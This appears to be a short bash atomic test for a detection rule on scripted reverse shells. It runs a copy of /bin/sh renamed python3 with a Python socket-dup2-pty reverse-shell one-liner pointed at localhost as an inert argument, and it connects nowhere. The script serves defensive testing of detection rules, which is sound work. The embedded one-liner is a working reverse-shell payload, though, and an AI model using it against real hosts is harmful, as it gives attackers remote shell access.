#!/usr/bin/env bash
# Atomic test - rule f7c3b270-a699-4597-a5b6-0e2860f3decf
#   "Scripted Reverse Shell via Python, Perl, PHP or Ruby"  (process_creation)
#
# Copies /bin/sh to a file named python3 and passes a socket-connect-dup2 one-liner
# as arguments, which is the command-line shape the rule keys on.
# The shell copy lives under /opt (not world-writable) so the broad
# execution-from-temp rule does not shadow this one. Nothing connects.
set -u
DIR=/opt/rustinel_atomic_pyrs.d
BIN="$DIR/python3"
mkdir -p "$DIR" 2>/dev/null || true
cp /bin/sh "$BIN" 2>/dev/null || cp /usr/bin/sh "$BIN" 2>/dev/null || true
chmod 0755 "$BIN" 2>/dev/null || true
timeout 3 "$BIN" -c 'sleep 1; :' 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",9));os.dup2(s.fileno(),0);pty.spawn("/bin/sh")' >/dev/null 2>&1 || true
rm -rf "$DIR" 2>/dev/null || true
exit 0
